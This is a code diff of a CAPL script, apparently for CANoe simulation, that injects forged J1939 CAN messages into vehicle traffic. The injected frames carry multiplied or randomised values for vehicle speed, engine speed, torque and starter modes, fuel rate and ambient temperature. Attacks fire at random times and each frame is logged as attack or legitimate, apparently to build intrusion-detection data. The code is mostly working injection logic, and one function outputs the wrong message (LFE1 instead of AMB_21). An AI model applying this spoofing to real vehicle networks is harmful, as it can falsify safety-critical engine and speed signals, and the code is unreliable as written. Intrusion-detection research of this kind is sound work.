@@ -3,9 +3,11 @@ variables
 {  
   message CAN1.TCO1 	 TCO1;
   message CAN1.EEC1 	 EEC1;
+  message CAN1.LFE1 	 LFE1;
+  message CAN1.AMB_21  AMB_21;
   timer Timer_Tattack1;
   timer Timer_Tattack2; 
-  timer Timer_Tattack3;
+  //timer Timer_Tattack3;
   long messageID;
   char hex_value[100];
   dword y;
@@ -16,6 +18,7 @@ variables
   double delayAttack = 0;
   byte rate_attack = 4;
   byte type_attack = 2;
+  byte target = 0;
 }
 
 //epsilon = 0 -> generate intrusion
@@ -29,6 +32,15 @@ on sysvar_change Intrusion::attackType{
   type_attack=sysGetVariableInt(sysvar::Intrusion::attackType);
 }
 
+on sysvar_change Intrusion::targetAttacked{
+  target=sysGetVariableInt(sysvar::Intrusion::targetAttacked);
+}
+
+on sysvar_change Intrusion::alphaValue{
+  alpha=sysGetVariableInt(sysvar::Intrusion::alphaValue);
+}
+
+
 //this function is used to convert hexa to decimal
 void HexToDec(long messageID){
   snprintf(hex_value,elcount(hex_value),"0x%x", messageID); 
@@ -36,7 +48,7 @@ void HexToDec(long messageID){
 }
 
 //Multiplication attack signal with alpha
-float AlphaAttack(float CANsignal, float alpha){
+float AlphaAttack(float CANsignal){
 
   //if the multiplied attack is greater than the last valid value, the last valid value will be send
   if((CANsignal*alpha)>64255){
@@ -51,11 +63,28 @@ void TCO1Attack(){
   TCO1.ESI = 1;      
   if(type_attack==1){
         writeToLogEx("multiplication");
-        TCO1.TcoVehSpeed=AlphaAttack(TCO1.TcoVehSpeed, 2);
+        if(target==2){
+          TCO1.TcoVehSpeed=AlphaAttack(TCO1.TcoVehSpeed);
+          TCO1.TcoPerf=AlphaAttack(TCO1.TcoPerf);
+          TCO1.HandInfo=AlphaAttack(TCO1.HandInfo);
+          TCO1.SysEvt=AlphaAttack(TCO1.SysEvt);
+        }
+        else if(target==6){
+          TCO1.TcoVehSpeed=AlphaAttack(TCO1.TcoVehSpeed);
+        }
   }
   else if(type_attack==0){
         writeToLogEx("fuzzy");
-        TCO1.TcoVehSpeed=random(64255.976);
+        if(target==2){
+          TCO1.TcoVehSpeed=random(64255.976);
+          TCO1.TcoPerf=random(4);
+          TCO1.HandInfo=random(4);
+          TCO1.SysEvt=random(4);
+        }
+        else if(target==6){
+          TCO1.TcoVehSpeed=random(64255.976);
+        }
+        
   }
   output(TCO1);
 }
@@ -65,13 +94,72 @@ void EEC1Attack(){
   EEC1.ESI = 1;      
   if(type_attack==1){
         writeToLogEx("multiplication");
-        EEC1.EngSpeed=AlphaAttack(EEC1.EngSpeed, 2);
+        if(target==1){
+          EEC1.EngSpeed=AlphaAttack(EEC1.EngSpeed);
+          EEC1.EngStarterMode = AlphaAttack(EEC1.EngStarterMode);
+          EEC1.EngTrqMode = AlphaAttack(EEC1.EngTrqMode);
+        }
+        else if(target==5){
+          EEC1.EngSpeed=AlphaAttack(EEC1.EngSpeed);
+        }
   }
   else if(type_attack==0){
         writeToLogEx("fuzzy");
-        EEC1.EngSpeed=random(64256);
+        if(target==1){
+          EEC1.EngSpeed=random(64256);
+          EEC1.EngStarterMode = random(16);
+          EEC1.EngTrqMode = random(16);
+        }
+        else if(target==5){
+          EEC1.EngSpeed=random(64256);
+        }
   }
   output(EEC1);
+}
+
+void LFE1Attack(){
+  //ESI is set to 1 when an intrusion occurs
+  LFE1.ESI = 1;      
+  if(type_attack==1){
+        writeToLogEx("multiplication");
+        if(target==3){
+          LFE1.EngFuelRate=AlphaAttack(LFE1.EngFuelRate);
+          LFE1.EngInstFuelEcon = AlphaAttack(LFE1.EngInstFuelEcon);
+        }
+        else if(target==7){
+          LFE1.EngFuelRate=AlphaAttack(LFE1.EngFuelRate);
+        }
+  }
+  else if(type_attack==0){
+        writeToLogEx("fuzzy");
+        if(target==3){
+          LFE1.EngFuelRate=random(64256);
+          LFE1.EngInstFuelEcon=random(64255.8355076211);
+        }
+        else if(target==7){
+          LFE1.EngFuelRate=random(64256);
+        }
+  }
+  output(LFE1);
+}
+
+void AMB_21Attack(){
+  //ESI is set to 1 when an intrusion occurs
+  AMB_21.ESI = 1;      
+  if(type_attack==1){
+        writeToLogEx("multiplication");
+        if(target==8){
+          AMB_21.AmbAirTemp=AlphaAttack(AMB_21.AmbAirTemp);
+        }
+  }
+  else if(type_attack==0){
+        writeToLogEx("fuzzy");
+        if(target == 8){
+          AMB_21.AmbAirTemp=random(64256);
+        }
+       
+  }
+  output(LFE1);
 }
 
 //this function sends an intrusion after delayAttack time
@@ -84,10 +172,10 @@ void StartAttack(double maxDelayAttack){
     delayAttack = random(maxDelayAttack);
     setTimer(Timer_Tattack2, 0, delayAttack*1000);
   }
-  else{
+  /*else{
     delayAttack = random(maxDelayAttack);
     setTimer(Timer_Tattack3,0, delayAttack*1000);
-  }
+  }*/
 }
 
 //TCO1 message - cycle time = 20 ms
@@ -97,8 +185,7 @@ on message TCO1{
   HexToDec(messageID);
   
   //ESI is set to 1 when an intrusion occurs
-  if(@Intrusion::messageID==messageID && @Intrusion::sendAttack==5){
-    writeToLogEx("startButton");
+  if(@Intrusion::sendAttack==5 && (target == 2 || target == 6)){
     if(TCO1.ESI==1){   
       writeToLogEx("atac");
       writeToLog(", %d, %f, %f, %f, %f, %d", dec_ID, getSignal(TCO1::TcoPerf), getSignal(TCO1::HandInfo), getSignal(TCO1::SysEvt), getSignal(TCO1::TcoVehSpeed), TCO1.ESI);
@@ -125,8 +212,7 @@ on message EEC1
   messageID=(this.id-0x80000000);
   HexToDec(messageID);
   
-  if(@Intrusion::messageID==messageID && @Intrusion::sendAttack==5){
-    writeToLogEx("startButton");
+  if(@Intrusion::sendAttack==5 && (target == 1 || target == 5)){
     if(EEC1.ESI==1){ 
       writeToLogEx("atac");
       writeToLog(", %d, %f, %f, %f, %d", dec_ID, getSignal(EEC1::EngTrqMode), getSignal(EEC1::EngSpeed), getSignal(EEC1::EngStarterMode), EEC1.ESI);
@@ -149,21 +235,85 @@ on message EEC1
   }
 }
 
+on message LFE1
+{
+  messageID=(this.id-0x80000000);
+  HexToDec(messageID);
+  
+  if(@Intrusion::sendAttack==5 && (target == 3 || target == 7)){
+    if(LFE1.ESI==1){ 
+      writeToLogEx("atac");
+      writeToLogEx("%d, %f, %f, %d", dec_ID, getSignal(LFE1::EngFuelRate), getSignal(LFE1::EngInstFuelEcon), LFE1.ESI);
+      LFE1.ESI=0; 
+    }
+    
+    else{
+      writeToLogEx("legit");
+      writeToLogEx("%d, %f, %f, %d", dec_ID, getSignal(LFE1::EngFuelRate), getSignal(LFE1::EngInstFuelEcon), LFE1.ESI);      
+      LFE1=this;
+      
+      epsilon=random(rate_attack);
+      if(epsilon==0 /*&& currentValEEC1 != 0*/){
+        StartAttack(90000);  
+      }      
+    }
+  }
+}
+
+on message AMB_21
+{
+  messageID=(this.id-0x80000000);
+  HexToDec(messageID);
+  
+  if(@Intrusion::sendAttack==5 && (target == 4 || target == 8)){
+    if(AMB_21.ESI==1){ 
+      writeToLogEx("atac");
+      writeToLogEx("%d, %f, %d", dec_ID, getSignal(AMB_21::AmbAirTemp), AMB_21.ESI);
+      AMB_21.ESI=0; 
+    }
+    
+    else{
+      writeToLogEx("legit");
+      writeToLogEx("%d, %f, %d", dec_ID, getSignal(AMB_21::AmbAirTemp), AMB_21.ESI); 
+      AMB_21=this;
+      
+      epsilon=random(rate_attack);
+      if(epsilon==0 /*&& currentValEEC1 != 0*/){
+        StartAttack(900000);  
+      }      
+    }
+  }
+}
 
 on timer Timer_Tattack1{
-  //TCO1Attack();
-  EEC1Attack();
+  if(target == 1 || target == 5)
+    EEC1Attack();
+  else if(target == 2 || target == 6)
+    TCO1Attack();
+  else if(target == 3 || target == 7)
+    LFE1Attack();
+  else if(target == 4 || target == 8)
+    AMB_21Attack();
 }
 
-on timer Timer_Tattack2{
+on timer Timer_Tattack2{ 
+  if(target == 1 || target == 5)
+    EEC1Attack();
+  else if(target == 2 || target == 6)
+    TCO1Attack();
+  else if(target == 3 || target == 7)
+    LFE1Attack();
+  else if(target == 4 || target == 8)
+    AMB_21Attack();
   
-  //TCO1Attack();
-  EEC1Attack();
 }
 
-on timer Timer_Tattack3{
-  //TCO1Attack();
-  EEC1Attack(); 
-}
+/*on timer Timer_Tattack3{
+  writeToLogEx("target: %d", target);
+  if(target == 1 || target == 5)
+    EEC1Attack();
+  else if(target == 2 || target == 6)
+    TCO1Attack();
+}*/
 
 
